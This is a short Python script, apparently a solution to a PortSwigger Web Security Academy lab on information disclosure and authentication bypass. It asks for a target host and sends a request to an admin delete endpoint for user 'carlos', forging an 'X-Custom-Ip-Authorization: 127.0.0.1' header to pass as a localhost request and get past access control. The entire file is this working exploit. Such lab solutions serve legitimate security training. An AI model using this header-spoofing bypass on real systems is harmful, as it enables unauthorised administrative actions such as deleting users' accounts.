import requests
from bs4 import BeautifulSoup
# Lab Url
# https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

# Enter URL
host = input('Enter Host without "/" in the end: ')
delete_endpoint = "/admin/delete?username=carlos"
headers = {'X-Custom-Ip-Authorization': '127.0.0.1'}
requests.get(url=host+delete_endpoint, headers=headers)
